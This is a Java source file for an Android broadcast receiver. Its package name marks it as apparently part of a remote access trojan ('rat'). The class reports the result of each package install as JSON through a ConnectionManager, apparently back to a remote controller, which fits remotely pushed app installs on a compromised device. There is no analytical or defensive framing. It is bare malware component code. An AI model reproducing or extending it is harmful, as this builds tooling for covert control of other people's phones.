package com.wexow.rat.admin;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInstaller;
import android.util.Log;

import com.wexow.rat.core.ConnectionManager;

import org.json.JSONObject;

public class InstallResultReceiver extends BroadcastReceiver {
    private static final String TAG = "InstallResult";

    @Override
    public void onReceive(Context ctx, Intent intent) {
        try {
            int status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, -999);
            String pkg = intent.getStringExtra(PackageInstaller.EXTRA_PACKAGE_NAME);
            String msg = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE);

            boolean success = (status == PackageInstaller.STATUS_SUCCESS);

            JSONObject jo = new JSONObject();
            jo.put("type", "install_result");
            jo.put("package", pkg);
            jo.put("success", success);
            jo.put("status", status);
            if (msg != null) jo.put("message", msg);
            ConnectionManager.send(jo.toString());

            Log.d(TAG, "Install result: " + pkg + " status=" + status);
        } catch (Exception e) {
            Log.e(TAG, "onReceive: " + e.getMessage());
        }
    }
}